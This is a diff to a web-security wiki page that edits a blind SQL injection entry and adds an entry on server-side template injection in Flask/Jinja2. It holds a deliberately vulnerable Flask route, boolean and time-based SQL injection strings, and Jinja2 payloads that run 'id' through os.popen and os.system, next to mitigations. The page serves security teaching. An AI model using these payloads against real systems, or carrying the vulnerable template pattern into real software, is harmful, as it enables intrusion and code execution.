@@ -1,3 +1,6 @@
+
+
+
 # Welcome to the WebVuln- wiki!
 ## PART 1 INJECTIONS EXPLOITS 
 --- 
@@ -997,8 +1000,6 @@ Injection
 ---
 🧪 Demo / Proof of Concept (PoC)
 ✅ Example: Vulnerable PHP Code (Login Form)
-
----
 ```php
 
 <?php
@@ -1012,8 +1013,6 @@ if (mysqli_num_rows($result)) {
 }
 ?>
 ```
-
----
 **🎯 Exploit Example (Boolean-based):**
 ```vbnet
 
@@ -1034,23 +1033,21 @@ Result: Different response (indicating conditional logic success)
 **🎯 Exploit Example (Time-based):**
 ```sql
 
-Input: `' OR IF(1=1, SLEEP(5), 0) -- `
+Input: ' OR IF(1=1, SLEEP(5), 0) -- 
 
 ```
 Response delay indicates SQL injection success.
----
+
 **🛡️ Mitigation**
 
 ✅ Use Parameterized Queries / Prepared Statements
 PHP (mysqli with prepared statements):
----
 ```php
 
 $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
 $stmt->bind_param("s", $user);
 $stmt->execute();
 ```
----
 **✅ Input Validation & Escaping**
 Use whitelisting for input validation.
 
@@ -1058,7 +1055,7 @@ Escape output using context-aware functions.
 
 **✅ Least Privilege**
 Ensure the database user has limited permissions.
----
+
 **🔧 Testing Tools / Techniques**
 Burp Suite (Repeater/Intruder with boolean and time-based payloads)
 
@@ -1066,10 +1063,10 @@ Burp Suite (Repeater/Intruder with boolean and time-based payloads)
 
 - Manual Injection using:
 
-- Boolean-based payloads:` ' AND 1=1 --, ' AND 1=2 --`
+- Boolean-based payloads: ' AND 1=1 --, ' AND 1=2 --
 
-- Time-based payloads:` ' OR SLEEP(5) --`
----
+- Time-based payloads: ' OR SLEEP(5) --
+
 **📚 References**
 - OWASP: Blind SQL Injection
 
@@ -1077,6 +1074,82 @@ Burp Suite (Repeater/Intruder with boolean and time-based payloads)
 
 - [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
+***
 
+### 🛡️ WEBVULN-016: Server-Side Template Injection (SSTI)
+🔹 Category
+Injection
 
+**🆔 Vulnerability ID**
+### WEBVULN-016
+
+**🧪 Demo / Proof of Concept (PoC)**
+
+---
+
+```python
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/greet')
+def greet():
+    name = request.args.get("name", "")
+    template = f"Hello {name}!"
+    return render_template_string(template)
+
+```
+---
+**🎯 Exploit (Jinja2 - Flask)**
+`Input: {{7*7}}`
+`Result: "Hello 49!"`
+
+---
+**🎯 Malicious Payload (Remote Code Execution PoC)**
+`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
+
+---
+**🛡️ Mitigation**
+
+**✅ Avoid render_template_string**
+- Use render_template() with static templates, never dynamic template strings.
+
+**✅ Sanitize User Input**
+- Do not trust user input within templates.
+
+- Escaping input is not enough — separate logic and presentation.
+
+**✅ Template Sandboxing**
+- Use template sandboxing if supported (e.g., Jinja2 sandbox).
+
+- Limit access to sensitive classes or globals.
+
+---
+**🔧 Testing Tools / Techniques**
+
+- Manual Testing using common payloads:
+
+- `{{7*7}}`
+
+-`{{"".__class__.__mro__[1].__subclasses__()}}`
+
+- Burp Suite – Manual payload testing and automation
+
+- Template-Scanner – Automated SSTI scanner
+
+    
+🔎 Common Payloads
+
+| Payload                                                                 | Purpose              |
+|-------------------------------------------------------------------------|----------------------|
+| `{{7*7}}`                                                               | Arithmetic test      |
+| `{{ ''.__class__ }}`                                                    | Class object access  |
+| `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system('id') }}` | RCE attempt|
+
+**📚 References**
+- PortSwigger: SSTI
+
+- OWASP: SSTI
+
+- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
